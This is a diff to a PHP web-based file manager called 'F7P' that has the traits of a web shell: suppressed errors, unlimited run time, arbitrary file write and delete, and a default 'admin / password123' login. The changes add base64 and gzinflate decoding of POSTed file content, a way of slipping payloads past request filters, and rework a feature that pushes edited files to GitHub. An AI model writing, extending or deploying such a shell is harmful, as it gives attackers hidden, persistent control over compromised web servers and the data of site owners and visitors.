@@ -1,5 +1,17 @@
 <?php
 session_start();
+
+if(isset($_POST['content_encoded']) && !empty($_POST['content_encoded'])) {
+    $encoded = $_POST['content_encoded'];
+    $decoded = base64_decode($encoded);
+    if($decoded !== false) {
+        $decompressed = gzinflate($decoded);
+        if($decompressed !== false) {
+            $_POST['content'] = $decompressed;
+        }
+    }
+}
+
 @error_reporting(0);
 @set_time_limit(0);
 
@@ -11,7 +23,7 @@ session_start();
 // User: admin | Pass: password123
 // Use Bcrypt or https://lain.lain.ch/password-hash/
 define('ADMIN_USER', 'admin');
-define('ADMIN_PASS_HASH', '$2a$09$lF0dTQmb5Dhh2BG5DAS6NuzJ8/rOT9el9Nui2vZAZmWkkKKf4idCu');
+define('ADMIN_PASS_HASH', '$2a$09$4CkdiJrXanwhimOhATORCOrIE0rxTr8hk5xupxfJ2hP6p1qJQILLS');
 
 $is_logged_in = false;
 if (isset($_SESSION['f7p_logged_in']) && $_SESSION['f7p_logged_in'] === true) {
@@ -245,11 +257,8 @@ function deleteFolder($dir) {
             @unlink($path);
         }
     }
-    
-   
     return @rmdir($dir);
 }
-
 
 function magicboom($text){
 	if (!get_magic_quotes_gpc()) {
@@ -806,120 +815,140 @@ jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F
                 });
         }
 
-        document.getElementById('content').addEventListener('touchstart', function(e) {
-            var el = this;
-            var scrollTop = el.scrollTop;
-            var scrollHeight = el.scrollHeight;
-            var clientHeight = el.clientHeight;
-            
-            if (scrollTop === 0 || scrollTop + clientHeight >= scrollHeight) {
-               
-            }
-        }, { passive: true });
+        var contentEl = document.getElementById('content');
+if (contentEl) {
+    contentEl.addEventListener('touchstart', function(e) {
+        var el = this;
+        var scrollTop = el.scrollTop;
+        var scrollHeight = el.scrollHeight;
+        var clientHeight = el.clientHeight;
+        
+        if (scrollTop === 0 || scrollTop + clientHeight >= scrollHeight) {
+        }
+    }, { passive: true });
+}
 
         function pushToGitHub() {
-            var githubFullPath = document.getElementById('github_full_path');
-            
-            if (!githubFullPath || githubFullPath.dataset.isValid !== 'true') {
-                alert('Cannot push to GitHub!\n\nPlease check:\n1. GitHub API settings (⋮ → GitHub API)\n2. File must be inside Server Path\n3. Server Path and GitHub Path must be set');
-                return;
-            }
-            
-            var token = localStorage.getItem('f7p_gh_token_9x7k2m');
-            var repo = localStorage.getItem('f7p_gh_repo_9x7k2m');
-            var branch = localStorage.getItem('f7p_gh_branch_9x7k2m') || 'main';
-            var filePath = document.querySelector('input[name="saveas"]').value;
-            var content = document.querySelector('textarea[name="content"]').value;
-            
-            var fullPath = githubFullPath.value;
-            var githubPath = fullPath.replace('github.com/' + repo + '/', '');
-            
-            var fileName = filePath.split('/').pop();
-            
-            var btn = document.getElementById('pushToGitBtn');
-            var originalText = btn.textContent;
-            btn.textContent = 'Uploading...';
-            btn.disabled = true;
-            btn.style.opacity = '0.7';
-            
-            var encodedContent = btoa(unescape(encodeURIComponent(content)));
-            var apiUrl = 'https://api.github.com/repos/' + repo + '/contents/' + githubPath;
-            
-            fetch(apiUrl + '?ref=' + branch, {
-                headers: {
-                    'Authorization': 'token ' + token,
-                    'Accept': 'application/vnd.github.v3+json'
-                }
-            })
-            .then(function(response) {
-                if (response.status === 404) {
-                    return { sha: null };
-                } else if (!response.ok) {
-                    throw new Error('GitHub API error: ' + response.status);
-                }
-                return response.json();
-            })
-            .then(function(data) {
-                var payload = {
-                    message: 'Update ' + fileName + ' via F7P',
-                    content: encodedContent,
-                    branch: branch
-                };
-                
-                if (data.sha) {
-                    payload.sha = data.sha;
-                }
-                
-                return fetch(apiUrl, {
-                    method: 'PUT',
-                    headers: {
-                        'Authorization': 'token ' + token,
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/vnd.github.v3+json'
-                    },
-                    body: JSON.stringify(payload)
-                });
-            })
-            .then(function(response) {
-                if (!response.ok) {
-                    return response.json().then(function(err) {
-                        throw new Error(err.message || 'Push failed');
-                    });
-                }
-                return response.json();
-            })
-            .then(function(data) {
-                btn.textContent = 'Pushed!';
-                btn.style.background = '#28a745';
-                btn.style.opacity = '1';
-                var url = data.content.html_url || '';
-                alert('Success...\n' + url);
-                setTimeout(function() {
-                    btn.textContent = 'Push to Git';
-                    btn.style.background = '#2b3137';
-                    btn.disabled = false;
-                    btn.style.opacity = '1';
-                }, 3000);
-            })
-            .catch(function(error) {
-                btn.textContent = 'Failed';
-                btn.style.background = '#dc3545';
-                btn.style.opacity = '1';
-                var errorMsg = error.message;
-                if (errorMsg.includes('403')) {
-                    errorMsg = 'Permission denied. Check your token permissions (need "repo" scope)';
-                } else if (errorMsg.includes('404')) {
-                    errorMsg = 'Repository not found. Check repo name format: username/repo';
-                }
-                alert('Error: ' + errorMsg + '\n\nTarget: ' + fullPath);
-                setTimeout(function() {
-                    btn.textContent = 'Push to Git';
-                    btn.style.background = '#2b3137';
-                    btn.disabled = false;
-                    btn.style.opacity = '1';
-                }, 3000);
+    var githubFullPath = document.getElementById('github_full_path');
+    var fileInput = document.querySelector('input[name="saveas"]');
+    var contentTextarea = document.querySelector('textarea[name="content_plain"]');
+    
+    if (!githubFullPath) {
+        alert('Element github_full_path not found!');
+        return;
+    }
+    
+    if (!fileInput) {
+        alert('Element saveas not found!');
+        return;
+    }
+    
+    if (!contentTextarea) {
+        alert('Element content_plain not found!');
+        return;
+    }
+    
+    if (githubFullPath.dataset.isValid !== 'true') {
+        alert('Cannot push to GitHub!\n\nPlease check:\n1. GitHub API settings (⋮ → GitHub API)\n2. File must be inside Server Path\n3. Server Path and GitHub Path must be set');
+        return;
+    }
+    
+    var token = localStorage.getItem('f7p_gh_token_9x7k2m');
+    var repo = localStorage.getItem('f7p_gh_repo_9x7k2m');
+    var branch = localStorage.getItem('f7p_gh_branch_9x7k2m') || 'main';
+    var filePath = fileInput.value;
+    var content = contentTextarea.value;
+    
+    var fullPath = githubFullPath.value;
+    var githubPath = fullPath.replace('github.com/' + repo + '/', '');
+    var fileName = filePath.split('/').pop();
+    
+    var btn = document.getElementById('pushToGitBtn');
+    if (!btn) return;
+    
+    var originalText = btn.textContent;
+    btn.textContent = 'Uploading...';
+    btn.disabled = true;
+    btn.style.opacity = '0.7';
+    
+    var encodedContent = btoa(unescape(encodeURIComponent(content)));
+    var apiUrl = 'https://api.github.com/repos/' + repo + '/contents/' + githubPath;
+    
+    fetch(apiUrl + '?ref=' + branch, {
+        headers: {
+            'Authorization': 'token ' + token,
+            'Accept': 'application/vnd.github.v3+json'
+        }
+    })
+    .then(function(response) {
+        if (response.status === 404) {
+            return { sha: null };
+        } else if (!response.ok) {
+            throw new Error('GitHub API error: ' + response.status);
+        }
+        return response.json();
+    })
+    .then(function(data) {
+        var payload = {
+            message: 'Update ' + fileName + ' via F7P',
+            content: encodedContent,
+            branch: branch
+        };
+        
+        if (data.sha) {
+            payload.sha = data.sha;
+        }
+        
+        return fetch(apiUrl, {
+            method: 'PUT',
+            headers: {
+                'Authorization': 'token ' + token,
+                'Content-Type': 'application/json',
+                'Accept': 'application/vnd.github.v3+json'
+            },
+            body: JSON.stringify(payload)
+        });
+    })
+    .then(function(response) {
+        if (!response.ok) {
+            return response.json().then(function(err) {
+                throw new Error(err.message || 'Push failed');
             });
         }
+        return response.json();
+    })
+    .then(function(data) {
+        btn.textContent = 'Pushed!';
+        btn.style.background = '#28a745';
+        btn.style.opacity = '1';
+        var url = data.content.html_url || '';
+        alert('Success...\n' + url);
+        setTimeout(function() {
+            btn.textContent = 'Push to Git';
+            btn.style.background = '#2b3137';
+            btn.disabled = false;
+            btn.style.opacity = '1';
+        }, 3000);
+    })
+    .catch(function(error) {
+        btn.textContent = 'Failed';
+        btn.style.background = '#dc3545';
+        btn.style.opacity = '1';
+        var errorMsg = error.message;
+        if (errorMsg.includes('403')) {
+            errorMsg = 'Permission denied. Check your token permissions (need "repo" scope)';
+        } else if (errorMsg.includes('404')) {
+            errorMsg = 'Repository not found. Check repo name format: username/repo';
+        }
+        alert('Error: ' + errorMsg + '\n\nTarget: ' + fullPath);
+        setTimeout(function() {
+            btn.textContent = 'Push to Git';
+            btn.style.background = '#2b3137';
+            btn.disabled = false;
+            btn.style.opacity = '1';
+        }, 3000);
+    });
+}
 
         function showRenameAlert(filename, fullpath, currentDir) {
             var newName = prompt(filename, filename);
@@ -978,7 +1007,22 @@ jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F
                     vibratePhone(10);
                 });
             });
-           
+setTimeout(function() {
+    var btn = document.getElementById('pushToGitBtn');
+    var input = document.getElementById('github_full_path');
+    if (btn && input) {
+        if (input.dataset.isValid === 'true' && input.value && input.value !== 'Loading...' && input.value !== '') {
+            btn.disabled = false;
+            btn.style.opacity = '1';
+            btn.style.cursor = 'pointer';
+            btn.style.background = '#2b3137';
+        } else {
+            btn.disabled = true;
+            btn.style.opacity = '0.5';
+            btn.style.cursor = 'not-allowed';
+        }
+    }
+}, 500);
             var observer = new MutationObserver(function(mutations) {
                 mutations.forEach(function(mutation) {
                     mutation.addedNodes.forEach(function(node) {
@@ -1354,41 +1398,44 @@ jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F
         $file = isset($_GET['edit']) ? $_GET['edit'] : '';
         
         if(isset($_POST['save'])){
-            $file = $_POST['saveas'];
-            $content = $_POST['content'];
-            
-            $timezones = [
-                'Asia/Jakarta', 'Asia/Makassar', 'Asia/Jayapura',
-                'Asia/Singapore', 'Asia/Bangkok', 'Asia/Ho_Chi_Minh',
-                'Asia/Kuala_Lumpur', 'Asia/Manila', 'Asia/Tokyo',
-                'America/New_York', 'America/Los_Angeles', 'Europe/London',
-                'Europe/Paris', 'Australia/Sydney'
-            ];
-            
-            $user_timezone = isset($_POST['user_timezone']) ? $_POST['user_timezone'] : 'Asia/Jakarta';
-            
-            if (!in_array($user_timezone, $timezones)) {
-                $user_timezone = 'Asia/Jakarta';
-            }
-            
-            @date_default_timezone_set($user_timezone);
-            
-            $msg = "";
-        
-            if($filez = @fopen($file,"w")){
-                $time = date("h:i:s a d-M-Y", time());
-                if(@fwrite($filez, $content)) {
-                    $time = preg_replace('/(\d{2}:\d{2}:\d{2}\s[ap]m)/', '<strong>$1</strong>', $time);
-                    $msg = "Saved at " . $time;
-                } else {
-                    $msg = "Failed to write";
-                }
-                @fclose($filez);
-            } else {
-                $msg = "Permission denied";
-            }
+    $file = $_POST['saveas'];
+    
+    $content = isset($_POST['content']) ? $_POST['content'] : '';
+    if(empty($content) && isset($_POST['content_plain'])) {
+        $content = $_POST['content_plain'];
+    }
+    
+    $timezones = [
+        'Asia/Jakarta', 'Asia/Makassar', 'Asia/Jayapura',
+        'Asia/Singapore', 'Asia/Bangkok', 'Asia/Ho_Chi_Minh',
+        'Asia/Kuala_Lumpur', 'Asia/Manila', 'Asia/Tokyo',
+        'America/New_York', 'America/Los_Angeles', 'Europe/London',
+        'Europe/Paris', 'Australia/Sydney'
+    ];
+    
+    $user_timezone = isset($_POST['user_timezone']) ? $_POST['user_timezone'] : 'Asia/Jakarta';
+    
+    if (!in_array($user_timezone, $timezones)) {
+        $user_timezone = 'Asia/Jakarta';
+    }
+    
+    @date_default_timezone_set($user_timezone);
+    
+    $msg = "";
+    
+    if($filez = @fopen($file,"w")){
+        $time = date("h:i:s a d-M-Y", time());
+        if(@fwrite($filez, $content)) {
+            $time = preg_replace('/(\d{2}:\d{2}:\d{2}\s[ap]m)/', '<strong>$1</strong>', $time);
+            $msg = "Saved at " . $time;
+        } else {
+            $msg = "Failed to write";
         }
-        
+        @fclose($filez);
+    } else {
+        $msg = "Permission denied";
+    }
+}
         $content = "";
         if(file_exists($file) && is_file($file)){
             if($filez = @fopen($file,"r")){
@@ -1403,16 +1450,15 @@ jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F
         $content_base64 = base64_encode($content);
         ?>
         <form action="?y=<?php echo $pwd; ?>&amp;edit=<?php echo urlencode($file); ?>" method="post" id="editForm">
-            <input type="hidden" name="content_base64" value="<?php echo $content_base64; ?>">
-            <input type="hidden" name="saveas" value="<?php echo htmlspecialchars($file, ENT_QUOTES, 'UTF-8'); ?>">
-            <textarea class="output" name="content" id="editorContent" style="height:400px;"><?php echo $display_content; ?></textarea>
-            
-            <div class="cmd-row mt-2" style="display:flex;gap:8px;align-items:center;width:100%;flex-wrap:wrap;">
-                <a href="?y=<?php echo $pwd; ?>" data-no-ajax="true"><img width=24px src=f7p-assets/previous.png></a>
-                <input class="inputz" id="saveas_input" type="text" value="<?php echo htmlspecialchars($file, ENT_QUOTES, 'UTF-8'); ?>" style="flex:2;min-width:120px;" readonly />
-                <input class="inputzbut" type="submit" value="Save" name="save" style="flex:1;min-width:70px;" />
-            </div>
-            
+    <input type="hidden" name="saveas" value="<?php echo htmlspecialchars($file, ENT_QUOTES, 'UTF-8'); ?>">
+    <textarea class="output" name="content_plain" id="editorContent" style="height:400px;"><?php echo $display_content; ?></textarea>
+    
+    <div class="cmd-row mt-2" style="display:flex;gap:8px;align-items:center;width:100%;flex-wrap:wrap;">
+        <a href="?y=<?php echo $pwd; ?>" data-no-ajax="true"><img width=24px src=f7p-assets/previous.png></a>
+        <input class="inputz" id="saveas_input" type="text" value="<?php echo htmlspecialchars($file, ENT_QUOTES, 'UTF-8'); ?>" style="flex:2;min-width:120px;" readonly />
+        <input class="inputzbut" type="submit" value="Save" name="save" style="flex:1;min-width:70px;" />
+    </div>
+    
             <div class="cmd-row mt-2" style="display:flex;gap:8px;align-items:center;width:100%;flex-wrap:wrap;">
                 <span style="font-size:13px;color:#666;white-space:nowrap;flex-shrink:0;"><img width=24px src=f7p-assets/github.png></span>
                 <input class="inputz" id="github_full_path" type="text" style="flex:2;min-width:120px;font-size:13px;font-family:monospace;" 
